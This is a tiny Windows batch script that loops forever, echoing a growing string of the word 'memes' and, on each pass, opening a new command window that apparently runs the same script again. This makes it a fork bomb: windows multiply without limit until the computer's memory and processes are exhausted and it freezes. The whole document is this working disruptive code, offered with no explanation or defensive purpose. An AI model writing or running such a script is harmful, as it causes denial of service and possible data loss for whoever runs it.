:b 
@SET m=%m% memes
@SET /A c=c+1
@echo %m% 
@start /I cmd.exe /T:0%c% /K call b
@goto b     
